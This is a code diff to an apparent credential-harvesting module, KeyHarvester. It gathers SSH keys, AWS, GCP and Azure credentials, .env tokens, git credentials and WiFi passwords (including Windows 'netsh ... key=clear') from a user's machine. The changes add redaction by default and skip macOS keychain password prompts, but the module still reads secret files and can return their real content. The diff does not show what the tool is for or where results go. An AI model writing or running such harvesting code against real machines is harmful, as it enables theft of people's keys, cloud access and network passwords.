@@ -24,9 +24,11 @@ import logging
 import os
 import platform
 import re
-from dataclasses import dataclass, asdict
+from dataclasses import dataclass, asdict, fields
 from pathlib import Path
 from typing import Any
+
+from utils.secure_string import SecureString
 
 logger = logging.getLogger(__name__)
 
@@ -40,12 +42,27 @@ class HarvestedKey:
     key_type: str         # ssh, aws, gcp, azure, env_token, git, gpg, wifi
     path: str             # file path where found
     identifier: str       # key name, AWS profile name, etc.
-    content: str          # the actual key/credential content
+    content: SecureString  # the actual key/credential content
     encrypted: bool       # whether the key is passphrase-protected
     metadata: dict[str, Any] | None = None
 
-    def to_dict(self) -> dict[str, Any]:
-        return asdict(self)
+    def to_dict(self, *, include_secrets: bool = False) -> dict[str, Any]:
+        """Serialise to a plain dict.
+
+        Parameters
+        ----------
+        include_secrets:
+            When *False* (default), the ``content`` value is replaced with
+            ``"[REDACTED]"``.  Pass *True* to include the real content.
+        """
+        d: dict[str, Any] = {}
+        for f in fields(self):
+            value = getattr(self, f.name)
+            if isinstance(value, SecureString):
+                d[f.name] = value.reveal() if include_secrets else "[REDACTED]"
+            else:
+                d[f.name] = value
+        return d
 
 
 class KeyHarvester:
@@ -102,7 +119,7 @@ class KeyHarvester:
                                 key_type="ssh",
                                 path=str(path),
                                 identifier=path.name,
-                                content=content,
+                                content=SecureString.from_plain(content),
                                 encrypted=encrypted,
                             ).to_dict())
                     except Exception:
@@ -117,7 +134,7 @@ class KeyHarvester:
                         key_type="ssh_config",
                         path=str(info_path),
                         identifier=info_file,
-                        content=info_path.read_text(errors="replace"),
+                        content=SecureString.from_plain(info_path.read_text(errors="replace")),
                         encrypted=False,
                     ).to_dict())
                 except Exception:
@@ -139,7 +156,7 @@ class KeyHarvester:
                         key_type="aws",
                         path=str(aws_file),
                         identifier=filename,
-                        content=content,
+                        content=SecureString.from_plain(content),
                         encrypted=False,
                     ).to_dict())
                 except Exception:
@@ -156,6 +173,8 @@ class KeyHarvester:
             Path.home() / ".config" / "gcloud",
             Path.home() / ".config" / "gcloud" / "legacy_credentials",
         ]
+        if self._platform == "windows":
+            gcp_dirs.append(Path(os.environ.get("APPDATA", "")) / "gcloud")
 
         for gcp_dir in gcp_dirs:
             if not gcp_dir.is_dir():
@@ -169,7 +188,7 @@ class KeyHarvester:
                                 key_type="gcp",
                                 path=str(json_file),
                                 identifier=json_file.name,
-                                content=content,
+                                content=SecureString.from_plain(content),
                                 encrypted=False,
                             ).to_dict())
                     except Exception:
@@ -183,7 +202,7 @@ class KeyHarvester:
                     key_type="gcp",
                     path=str(adc),
                     identifier="application_default_credentials",
-                    content=adc.read_text(errors="replace"),
+                    content=SecureString.from_plain(adc.read_text(errors="replace")),
                     encrypted=False,
                 ).to_dict())
             except Exception:
@@ -209,7 +228,7 @@ class KeyHarvester:
                             key_type="azure",
                             path=str(json_file),
                             identifier=json_file.name,
-                            content=content,
+                            content=SecureString.from_plain(content),
                             encrypted=False,
                         ).to_dict())
                 except Exception:
@@ -252,7 +271,7 @@ class KeyHarvester:
                             key_type="env_token",
                             path=str(env_file),
                             identifier=str(env_file.relative_to(Path.home())),
-                            content=content,
+                            content=SecureString.from_plain(content),
                             encrypted=False,
                         ).to_dict())
                 except Exception:
@@ -273,7 +292,7 @@ class KeyHarvester:
                     key_type="git",
                     path=str(git_cred),
                     identifier=".git-credentials",
-                    content=git_cred.read_text(errors="replace"),
+                    content=SecureString.from_plain(git_cred.read_text(errors="replace")),
                     encrypted=False,
                 ).to_dict())
             except Exception:
@@ -297,7 +316,7 @@ class KeyHarvester:
                             key_type="git",
                             path=str(rc_path),
                             identifier=rc_file,
-                            content="\n".join(token_lines),
+                            content=SecureString.from_plain("\n".join(token_lines)),
                             encrypted=False,
                         ).to_dict())
                 except Exception:
@@ -339,11 +358,12 @@ class KeyHarvester:
                 ssid = line.strip()
                 if not ssid:
                     continue
-                # Try to get the password (may require admin rights)
+                # Record the WiFi network without requesting the plaintext password
+                # (the -w flag would trigger a Keychain auth dialog).
                 try:
                     pw_proc = subprocess.run(
                         ["security", "find-generic-password", "-D", "AirPort network password",
-                         "-s", ssid, "-w"],
+                         "-s", ssid],
                         capture_output=True, text=True, timeout=10,
                     )
                     if pw_proc.returncode == 0:
@@ -351,7 +371,7 @@ class KeyHarvester:
                             key_type="wifi",
                             path="keychain",
                             identifier=ssid,
-                            content=pw_proc.stdout.strip(),
+                            content=SecureString.from_plain("[keychain-protected]"),
                             encrypted=False,
                             metadata={"ssid": ssid},
                         ).to_dict())
@@ -372,6 +392,8 @@ class KeyHarvester:
                 ["netsh", "wlan", "show", "profiles"],
                 capture_output=True, text=True, timeout=10,
             )
+            if proc.returncode != 0:
+                return results
             for line in proc.stdout.splitlines():
                 if "All User Profile" in line or "Current User Profile" in line:
                     profile = line.split(":")[1].strip()
@@ -381,6 +403,8 @@ class KeyHarvester:
                         ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                         capture_output=True, text=True, timeout=10,
                     )
+                    if pw_proc.returncode != 0:
+                        continue
                     for pw_line in pw_proc.stdout.splitlines():
                         if "Key Content" in pw_line:
                             password = pw_line.split(":")[1].strip()
@@ -388,7 +412,7 @@ class KeyHarvester:
                                 key_type="wifi",
                                 path="netsh",
                                 identifier=profile,
-                                content=password,
+                                content=SecureString.from_plain(password),
                                 encrypted=False,
                                 metadata={"ssid": profile},
                             ).to_dict())
@@ -416,7 +440,7 @@ class KeyHarvester:
                                 key_type="wifi",
                                 path=str(conf_file),
                                 identifier=ssid,
-                                content=password,
+                                content=SecureString.from_plain(password),
                                 encrypted=False,
                                 metadata={"ssid": ssid},
                             ).to_dict())
